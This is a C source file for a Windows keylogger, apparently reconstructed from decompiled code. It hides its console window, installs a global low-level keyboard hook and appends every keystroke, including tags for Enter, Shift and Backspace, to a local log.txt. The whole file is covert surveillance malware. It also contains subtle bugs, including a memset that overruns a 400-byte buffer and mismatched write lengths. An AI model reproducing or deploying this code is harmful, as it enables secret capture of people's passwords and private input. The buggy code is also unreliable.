#include <stdio.h>
#include <windows.h>
#include <winuser.h>

HANDLE __cdecl f1(unsigned int Buffer) {
    HANDLE result;
    HWND ForegroundWindow;
    DWORD v3;
    DWORD v4;
    DWORD v5;
    HANDLE hFile;
    DWORD NumberOfBytesWritten;
    char Str2[1024];
    char Str1[1024];
    char aWindow[12] = "\n[Window: ";
    char asc[4] = "]\n";
    NumberOfBytesWritten = 0;
    result = CreateFileA(LPCSTR("log.txt"), 0x40000000u, 2u, 0, 4u, 0x80u, 0);
    hFile = result;
    if (result != (HANDLE)-1)
    {
        SetFilePointer(result, 0, 0, 2u);
        ForegroundWindow = GetForegroundWindow();
        GetWindowTextA(ForegroundWindow, Str2, 1024);
        if (Buffer < 0x27 || Buffer > 0x40)
        {
            if (Buffer <= 0x40 || Buffer >= 0x5B)
            {
                switch (Buffer)
                {
                case 8u:
                    v4 = strlen("[BACKSPACE]");
                    WriteFile(hFile, "BACKSPACE", v4, &NumberOfBytesWritten, 0);
                    break;
                case 9:
                    WriteFile(hFile, "[TAB]", 5u, &NumberOfBytesWritten, 0);
                    break;
                case 0xD:
                    WriteFile(hFile, "[ENTER]", 8u, &NumberOfBytesWritten, 0);
                    break;
                case 0x10:
                    WriteFile(hFile, "[SHIFT]", 7u, &NumberOfBytesWritten, 0);
                    break;
                case 0x11:
                    WriteFile(hFile, "[CTRL]", 6u, &NumberOfBytesWritten, 0);
                    break;
                case 0x14:
                    v5 = strlen("[CAPS LOCK]");
                    WriteFile(hFile, "[CAPS LOCK]", v5, &NumberOfBytesWritten, 0);
                    break;
                case 0x20u:
                    WriteFile(hFile, " ", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x2Eu:
                    WriteFile(hFile, "[DEL]", 5u, &NumberOfBytesWritten, 0);
                    break;
                case 0x60u:
                    WriteFile(hFile, "0", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x61u:
                    WriteFile(hFile, "1", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x62u:
                    WriteFile(hFile, "2", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x63u:
                    WriteFile(hFile, "3", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x64u:
                    WriteFile(hFile, "4", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x65u:
                    WriteFile(hFile, "5", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x66u:
                    WriteFile(hFile, "6", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x67u:
                    WriteFile(hFile, "7", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x68u:
                    WriteFile(hFile, "8", 1u, &NumberOfBytesWritten, 0);
                    break;
                case 0x69u:
                    WriteFile(hFile, "9", 1u, &NumberOfBytesWritten, 0);
                    break;
                default:
                    bool b = CloseHandle(hFile);
                    return (HANDLE)b;
                }
            }
            else
            {
                Buffer += 32;
                WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
            }
        }
        else
        {
            WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
        }
        bool a = CloseHandle(hFile);
        return (HANDLE)a;
    }
    return result;
}

LRESULT CALLBACK fn(int nCode, WPARAM wParam, LPARAM* lParam)
{
    if (!nCode && wParam == 260 || wParam == 256) {
        f1(*lParam);
    }
    return CallNextHookEx(0, nCode, wParam, (LPARAM)lParam);
}

int __cdecl main(int argc, const char** argv, const char** envp)
{
    HMODULE ModuleHandleA;
    HWND hWnd;
    HHOOK hhk;
    char Str1[400];

    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", 0);
    if (hWnd)
        ShowWindow(hWnd, 0);
    memset(Str1, 1, 1024);

    hhk = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)fn, NULL, 0);
    while (GetMessageA(0, 0, 0, 0))
        ;
    return UnhookWindowsHookEx(hhk);
}